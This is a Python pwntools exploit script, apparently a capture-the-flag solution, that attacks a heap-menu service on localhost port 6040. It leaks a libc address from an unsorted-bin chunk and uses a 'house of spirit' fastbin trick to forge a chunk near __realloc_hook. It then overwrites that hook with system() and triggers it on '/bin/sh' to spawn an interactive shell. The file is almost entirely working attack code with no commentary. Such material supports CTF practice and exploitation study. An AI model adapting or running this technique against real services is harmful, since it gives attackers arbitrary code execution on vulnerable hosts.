#!/usr/bin/env python

import binascii
from pwn import *

DEBUG = False


def wait(msg):
    s = p.recvuntil(msg)
    if DEBUG:
        print s


def malloc(size):
    wait('cmd>> ')
    p.sendline('0')
    wait('size>> ')
    p.sendline(str(size))


def realloc(addr, size):
    wait('cmd>> ')
    p.sendline('1')
    wait('addr>> ')
    if isinstance(addr, str):
        p.sendline(addr)
    else:
        p.sendline('%x' % addr)
    wait('size>> ')
    p.sendline(str(size))


def free(addr):
    wait('cmd>> ')
    p.sendline('2')
    wait('addr>> ')
    if isinstance(addr, str):
        p.sendline(addr)
    else:
        p.sendline('%x' % addr)


def fill(addr, data):
    wait('cmd>> ')
    p.sendline('3')
    wait('addr>> ')
    if isinstance(addr, str):
        p.sendline(addr)
    else:
        p.sendline('%x' % addr)
    wait('data>> ')
    for b in data:
        p.sendline('%x' % ord(b))


def dump(addr):
    wait('cmd>> ')
    p.sendline('4')
    wait('addr>> ')
    if isinstance(addr, str):
        p.sendline(addr)
    else:
        p.sendline('%x' % addr)
    return p.recvline()


def blocklist():
    wait('cmd>> ')
    p.sendline('5')
    return p.recvuntil('\n\n')


p = remote('localhost', 6040)

malloc(24)


# libc leak
malloc(123)
malloc(456)  # 24, 123, 456

free('i1')  # 24, 456
malloc(123)  # 24, 456, 123

s = dump('i2')[:3*8].replace(' ', '')
s = binascii.unhexlify(s)
unsorted_bin_chunk = u64(s)

log.success('Unsorted bin chunk addr: %x' % unsorted_bin_chunk)

free('i2')  # 24, 456
free('i1')  # 24

UNSORTED_BIN_OFFSET = 0x3BE7B8

libc = unsorted_bin_chunk - UNSORTED_BIN_OFFSET
log.success('libc base addr: %x' % libc)


# house of spirit
REALLOC_HOOK_OFFSET = 0x3BE730
FAKE_CHUNK_OFFSET = 0x3BE70D  # size = 0x7F (0x78 + flag)

SYSTEM_OFFSET = 0x46590

malloc(0x68)  # 24, 0x68
free('i1')  # 24
realloc('i0', 24)  # 24, 0x68
fill('i1', p64(libc + FAKE_CHUNK_OFFSET) + 'A' * (0x68 - 8))
print dump('i1')

malloc(0x68)  # 24, 0x68, 0x68
malloc(0x68)  # 24, 0x68, 0x68, 0x68
print blocklist()


# overwrite realloc_hook
fill('i0', '/bin/sh' + '\x00' * 17)

s = dump('i3')
prefix = s[:3*19].replace(' ', '')
prefix = binascii.unhexlify(prefix)
suffix = s[3*27:3*0x68].replace(' ', '')
suffix = binascii.unhexlify(suffix)
fill('i3', prefix + p64(libc + SYSTEM_OFFSET) + suffix)

realloc('i0', 0xdeadbeef)
p.interactive()
